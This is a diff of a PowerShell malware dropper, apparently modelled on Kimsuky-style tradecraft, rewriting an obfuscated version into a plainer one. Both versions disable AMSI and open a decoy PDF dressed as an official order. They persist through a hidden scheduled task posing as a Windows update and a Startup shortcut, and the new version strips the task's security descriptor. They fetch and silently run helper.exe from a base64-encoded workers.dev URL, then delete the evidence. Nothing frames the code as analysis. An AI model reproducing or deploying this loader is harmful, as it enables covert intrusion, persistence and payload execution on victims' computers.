@@ -1,155 +1,94 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-# === LAYERED AMSI BYPASS ===
+# === LEVEL 1: AMSI BYPASS ===
 try {
-    # Method 1: Patch amsiInitFailed
-    $a = [Ref].Assembly.GetType(('System.Management.Automation.'+[char]65+'msiUtils'))
-    $a.GetField(('amsiInitFailed'),('NonPublic,Static')).SetValue($null,$true)
-} catch {}
-try {
-    # Method 2: Registry provider redirection (Kimsuky style)
-    $k = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(('SOFTWARE\Microsoft\AMSI\Providers'), $true)
-    if ($k) { $k.DeleteSubKey('{2781761E-28E0-4109-99FE-B9D127C57AFE}'); $k.Close() }
+    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+    $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 } catch {}
 
-# === RANDOM JITTER (Initial) ===
-Start-Sleep -Milliseconds (Get-Random -Min 300 -Max 800)
+$cache = "$env:APPDATA\Microsoft\Windows\Caches"
+if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
 
-# === OBFUSCATED PATHS (String Splitting) ===
-$ap = [char]65+[char]112+[char]112+[char]68+[char]97+[char]116+[char]97
-$mi = [char]77+[char]105+[char]99+[char]114+[char]111+[char]115+[char]111+[char]102+[char]116
-$wi = [char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115
-$ca = [char]67+[char]97+[char]99+[char]104+[char]101+[char]115
-$cache = "$env:$ap\$mi\$wi\$ca"
-if (-not (Test-Path $cache)) { & ([char]78+[char]101+[char]119)+'-Item' -ItemType Directory -Path $cache -Force | Out-Null }
+$flagFile = "$cache\installed.flag"
+$isFirstRun = -not (Test-Path $flagFile)
 
-# === FLAG FILE (Obfuscated) ===
-$flag = "$cache\"+([char]105+[char]110+[char]115+[char]116+[char]97+[char]108+[char]108+[char]101+[char]100)+'.'+([char]102+[char]108+[char]97+[char]103)
-$isFirst = -not (Test-Path $flag)
-
-# === PDF URL (Base64 Obfuscated) ===
 $pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LTQucGRm'))
-$pdfPath = "$cache\"+([char]78+[char]97+[char]107+[char]97+[char]122)+'_No._661_vid_02.03.2026-4.pdf'
+$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"
 
 $headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
 
-# === IMMEDIATE PDF DECOY ===
-if ($isFirst) {
+if ($isFirstRun) {
     if (-not (Test-Path $pdfPath)) {
-        try { & ([char]73+[char]110+[char]118+[char]111+[char]107+[char]101)+'-WebRequest' -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}
+        try { Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}
     }
     if (Test-Path $pdfPath) {
-        try { & ([char]83+[char]116+[char]97+[char]114+[char]116)+'-Process' $pdfPath } catch {}
-        & ([char]78+[char]101+[char]119)+'-Item' -Path $flag -ItemType File -Force | Out-Null
+        try { Start-Process $pdfPath } catch {}
+        New-Item -Path $flagFile -ItemType File -Force | Out-Null
     }
 }
 
-# === SELF-PRESERVATION (Obfuscated) ===
-$local = "$cache\"+([char]108+[char]97+[char]117+[char]110+[char]99+[char]104+[char]101+[char]114)+'.ps1'
-$curr = $MyInvocation.MyCommand.Path
+$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
+$currentPath = $MyInvocation.MyCommand.Path
 
 function Save-ScriptToDisk {
-    param([string]$D)
-    $d = Split-Path $D -Parent
-    if (-not (Test-Path $d)) { & ([char]78+[char]101+[char]119)+'-Item' -ItemType Directory -Path $d -Force | Out-Null }
-    if (-not $curr -or $curr -eq '') {
+    param([string]$Destination)
+    $dir = Split-Path $Destination -Parent
+    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+    if (-not $currentPath -or $currentPath -eq '') {
         try {
-            $raw = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
-            (& ([char]78+[char]101+[char]119)+'-Object' Net.WebClient).DownloadFile($raw, $D)
+            $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
+            (New-Object System.Net.WebClient).DownloadString($rawUrl) | Out-File -FilePath $Destination -Encoding UTF8 -Force
         } catch { exit }
     } else {
-        Copy-Item $curr $D -Force
+        Copy-Item -Path $currentPath -Destination $Destination -Force
     }
-    return $D
+    return $Destination
 }
-$scriptPath = Save-ScriptToDisk -Destination $local
+$scriptPath = Save-ScriptToDisk -Destination $localPath
 
-# === KIMSUKY-STYLE XML SCHEDULED TASK ===
-$taskName = ([char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115)+'UpdateTask'
-$xmlTask = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <Triggers>
-    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
-  </Triggers>
-  <Actions Context="Author">
-    <Exec>
-      <Command>powershell.exe</Command>
-      <Arguments>-ExecutionPolicy Bypass -WindowStyle Hidden -File "$scriptPath"</Arguments>
-    </Exec>
-  </Actions>
-  <Settings>
-    <Hidden>true</Hidden>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <StartWhenAvailable>true</StartWhenAvailable>
-  </Settings>
-</Task>
-"@
-$xmlPath = "$env:TEMP\task.xml"
-$xmlPath = "$env:TEMP\task.xml"
-try {
-    $xmlTask | Out-File -FilePath $xmlPath -Encoding Unicode -Force
-    & ([char]115+[char]99+[char]104+[char]116+[char]97+[char]115+[char]107+[char]115) /create /tn $taskName /xml $xmlPath /f
-    Remove-Item $xmlPath -Force
-} catch {}
-
-# === HIDDEN + SYSTEM FOLDER (Anti-Forensics) ===
-try { & ([char]97+[char]116+[char]116+[char]114+[char]105+[char]98) +h +s $cache } catch {}
-
-# === STARTUP LNK (Backup) ===
-$startup = "$env:$ap\$mi\$wi\Start Menu\Programs\Startup"
-$lnk = "$startup\WindowsUpdateHelper.lnk"
-if (-not (Test-Path $lnk)) {
+$taskName = "WindowsUpdateTask"
+$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+if (-not $taskExists) {
+    $trigger = New-ScheduledTaskTrigger -AtLogOn
+    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
+    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
     try {
-        $wsh = & ([char]78+[char]101+[char]119)+'-Object' -ComObject WScript.Shell
-        $sc = $wsh.CreateShortcut($lnk)
-        $sc.TargetPath = 'powershell.exe'
-        $sc.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
-        $sc.WindowStyle = 7
-        $sc.Save()
+        $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
+        if (Test-Path $taskPath) { Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction Stop }
     } catch {}
 }
 
-# === RANDOM JITTER BEFORE BEARFOOS DELAY ===
-Start-Sleep -Seconds (Get-Random -Min 5 -Max 15)
+$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
+if (-not (Test-Path $lnkPath)) {
+    $wshShell = New-Object -ComObject WScript.Shell
+    $shortcut = $wshShell.CreateShortcut($lnkPath)
+    $shortcut.TargetPath = "powershell.exe"
+    $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
+    $shortcut.WindowStyle = 7
+    $shortcut.Save()
+}
 
-# === BEARFOOS EVASION DELAY ===
 Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
-# === EXE URL (Worker) ===
 $exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'))
 $exePath = "$cache\helper.exe"
 
-# === DOWNLOAD & EXECUTE WITH RETRY ===
 if (-not (Test-Path $exePath)) {
-    $r = 0; $m = 3
+    $retryCount = 0; $maxRetries = 3
     do {
-        try {
-            (& ([char]78+[char]101+[char]119)+'-Object' Net.WebClient).DownloadFile($exeUrl, $exePath)
-            break
-        } catch {
-            $r++
-            Start-Sleep -Seconds (Get-Random -Min 3 -Max 8)
-        }
-    } while ($r -lt $m)
+        try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing; break } catch { $retryCount++; Start-Sleep -Seconds 5 }
+    } while ($retryCount -lt $maxRetries)
 }
 
 if (Test-Path $exePath) {
-    Start-Sleep -Milliseconds (Get-Random -Min 200 -Max 600)
     try {
-        & ([char]73+[char]110+[char]118+[char]111+[char]107)+'e-WmiMethod' -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop | Out-Null
+        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop | Out-Null
     } catch {
-        try {
-            (& ([char]78+[char]101+[char]119)+'-Object' -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false)
-        } catch {
-            & ([char]83+[char]116)+'art-Process' $exePath -WindowStyle Hidden
-        }
+        try { (New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false) } catch { Start-Process $exePath -WindowStyle Hidden }
     }
 }
 
-# === CLEANUP ===
-Start-Job -ScriptBlock {
-    param($e, $p)
-    Start-Sleep -Seconds (Get-Random -Min 280 -Max 320)
-    Remove-Item $e, $p -Force -ErrorAction SilentlyContinue
-} -ArgumentList $exePath, $pdfPath | Out-Null
+Start-Job -ScriptBlock { param($exe, $pdf) Start-Sleep -Seconds 300; Remove-Item $exe,$pdf -Force -ErrorAction SilentlyContinue } -ArgumentList $exePath, $pdfPath | Out-Null
